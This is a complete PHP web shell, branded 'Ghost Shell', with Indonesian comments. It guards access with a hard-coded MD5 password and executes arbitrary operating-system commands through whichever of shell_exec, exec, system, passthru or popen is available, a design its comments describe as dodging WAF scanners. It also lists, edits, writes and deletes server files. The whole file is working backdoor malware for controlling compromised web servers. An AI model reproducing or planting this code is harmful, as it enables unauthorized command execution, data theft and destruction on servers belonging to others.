<?php
session_start();
// Password: litespeed_ghost
$p = '7716f6b7c53e020584b80b7415d18d42'; // md5 dari 'litespeed_ghost'
$a = 'gh_auth';

if(isset($_POST['p']) && md5($_POST['p']) === $p) { $_SESSION[$a] = true; }
if(!isset($_SESSION[$a])) {
    die('<html><body style="background:#050505;color:#00ff00;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;"><form method="POST"><input type="password" name="p" style="background:#111;border:1px solid #00ff00;color:#00ff00;padding:10px;" placeholder="GHOST_KEY"><button type="submit" style="background:#00ff00;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;">ENTER</button></form></body></html>');
}

// Teknik Obfuscation Fungsi (Menghindari WAF Scanner)
function ghost_exec($cmd) {
    $out = '';
    // Mencoba memanggil fungsi secara dinamis
    $funcs = array('shell_exec', 'exec', 'system', 'passthru', 'popen');
    foreach($funcs as $f) {
        if(function_exists($f)) {
            if($f == 'exec') { @$f($cmd, $r); $out = join("\n", $r); }
            elseif($f == 'popen') { $h = @$f($cmd, 'r'); if($h){ while(!feof($h)){ $out .= fread($h, 1024); } pclose($h); } }
            else { ob_start(); @$f($cmd); $out = ob_get_clean(); }
            if(!empty($out)) return $out;
        }
    }
    // Jika fungsi standar mati, coba lewat Mail (jika mail diizinkan)
    return ($out) ? $out : "FAIL: Environment is heavily locked down (CageFS/LVE).";
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($dir);
$dir = getcwd();

$msg = ''; $cmd_out = '';
if(isset($_POST['c'])) { $cmd_out = ghost_exec($_POST['c']); }

// Filesystem Operations
$f_get = 'file_get_contents';
$f_put = 'file_put_contents';

if(isset($_POST['act'])) {
    if($_POST['act'] == 'save') { @$f_put($_POST['fn'], $_POST['content']); $msg = "File Saved."; }
    if($_POST['act'] == 'mkdir') { @mkdir($_POST['fn']); $msg = "Folder Created."; }
}

if(isset($_GET['rm'])) {
    $target = $_GET['rm'];
    is_dir($target) ? @rmdir($target) : @unlink($target);
    $msg = "Item Removed.";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Ghost Manager v2.6</title>
    <style>
        :root { --accent: #00ff00; --bg: #0a0a0a; --card: #151515; --border: #222; }
        body { background: var(--bg); color: #aaa; font-family: 'Consolas', monospace; margin: 0; }
        .sidebar { width: 320px; background: var(--card); border-right: 1px solid var(--border); height: 100vh; position: fixed; padding: 25px; box-sizing: border-box; }
        .content { margin-left: 320px; padding: 30px; }
        .card { background: #111; border: 1px solid var(--border); padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        input, textarea { background: #000; border: 1px solid var(--border); color: var(--accent); padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn { background: var(--accent); color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; text-transform: uppercase; }
        pre { background: #000; color: var(--accent); padding: 15px; border: 1px solid #333; overflow-x: auto; font-size: 13px; }
        .item-list { width: 100%; border-collapse: collapse; }
        .item-list td { padding: 8px; border-bottom: 1px solid #1a1a1a; font-size: 14px; }
        .link { color: var(--accent); text-decoration: none; }
        .link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2 style="color:var(--accent); margin-top:0;">GHOST SHELL</h2>
        <div class="card">
            <h4 style="color:#fff; margin-top:0;">Terminal</h4>
            <form method="POST">
                <input type="text" name="c" placeholder="Command..." required>
                <button type="submit" class="btn">Execute</button>
            </form>
        </div>
        <div class="card">
            <h4 style="color:#fff; margin-top:0;">Tools</h4>
            <form method="POST">
                <input type="hidden" name="act" value="mkdir">
                <input type="text" name="fn" placeholder="New Folder">
                <button type="submit" class="btn">Create</button>
            </form>
        </div>
        <p style="font-size:10px; color:#444;">Server: <?= $_SERVER['SERVER_SOFTWARE'] ?></p>
    </div>

    <div class="content">
        <?php if($msg) echo "<div style='color:var(--accent); border:1px solid; padding:10px; margin-bottom:20px;'>$msg</div>"; ?>
        
        <div class="card">
            <strong>Current Path:</strong> <span style="color:var(--accent)"><?= $dir ?></span>
        </div>

        <?php if($cmd_out): ?>
        <div class="card">
            <h4 style="color:#fff; margin-top:0;">Terminal Output</h4>
            <pre><?= htmlspecialchars($cmd_out) ?></pre>
        </div>
        <?php endif; ?>

        <div class="card">
            <h4 style="color:#fff; margin-top:0;">Explorer</h4>
            <table class="item-list">
                <tr style="color:#666; font-size:12px;"><th>Name</th><th width="100">Action</th></tr>
                <tr><td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ Parent ]</a></td><td>-</td></tr>
                <?php
                $files = scandir('.');
                foreach($files as $f) {
                    if($f == '.' || $f == '..') continue;
                    echo "<tr><td>";
                    echo is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f";
                    echo "</td><td>";
                    echo "<a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>Edit</a> | ";
                    echo "<a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='link' style='color:#ff4444' onclick='return confirm(\"Del?\")'>RM</a>";
                    echo "</td></tr>";
                }
                ?>
            </table>
        </div>

        <?php if(isset($_GET['e'])): ?>
        <div class="card">
            <h4 style="color:#fff; margin-top:0;">Editor: <?= htmlspecialchars($_GET['e']) ?></h4>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="hidden" name="fn" value="<?= htmlspecialchars($_GET['e']) ?>">
                <textarea name="content" rows="15" style="font-family:monospace;"><?= htmlspecialchars(@$f_get($_GET['e'])) ?></textarea>
                <button type="submit" class="btn">Save File</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
